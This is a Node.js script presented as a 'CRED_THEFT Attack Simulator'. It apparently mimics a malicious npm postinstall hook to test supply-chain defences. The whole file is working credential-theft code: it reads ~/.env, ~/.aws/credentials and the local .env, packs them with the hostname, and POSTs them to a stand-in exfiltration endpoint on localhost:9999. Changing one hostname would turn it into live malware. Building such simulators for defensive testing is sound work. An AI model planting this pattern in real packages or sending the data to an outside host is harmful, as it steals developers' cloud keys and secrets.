/**
 * CRED_THEFT Attack Simulator
 * 
 * Reads ~/.env and ~/.aws/credentials, then attempts to POST
 * the stolen content to localhost:9999 (exfiltration endpoint).
 * 
 * This simulates the most common npm supply chain attack pattern:
 * a malicious postinstall script stealing environment secrets.
 */

const fs = require('fs');
const path = require('path');
const http = require('http');
const os = require('os');

console.log('[CRED_THEFT] postinstall script executing...');

const targets = [
  path.join(os.homedir(), '.env'),
  path.join(os.homedir(), '.aws', 'credentials'),
  path.join(process.cwd(), '.env'),
];

let stolen = {};

for (const target of targets) {
  try {
    if (fs.existsSync(target)) {
      const content = fs.readFileSync(target, 'utf8');
      stolen[target] = content;
      console.log(`[CRED_THEFT] Read ${target} (${content.length} bytes)`);
    }
  } catch (err) {
    // Silently continue — real malware would too
  }
}

if (Object.keys(stolen).length === 0) {
  stolen['fallback'] = 'AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/EXAMPLE';
  console.log('[CRED_THEFT] No real targets found, using fallback data');
}

// Attempt exfiltration via HTTP POST
const postData = JSON.stringify({
  attack: 'CRED_THEFT',
  stolen_from: Object.keys(stolen),
  data: stolen,
  timestamp: new Date().toISOString(),
  hostname: os.hostname(),
});

const req = http.request(
  {
    hostname: 'localhost',
    port: 9999,
    path: '/exfil',
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'Content-Length': Buffer.byteLength(postData),
    },
  },
  (res) => {
    console.log(`[CRED_THEFT] Exfil server responded: ${res.statusCode}`);
  }
);

req.on('error', (err) => {
  console.log(`[CRED_THEFT] Exfil failed: ${err.message}`);
});

req.write(postData);
req.end();
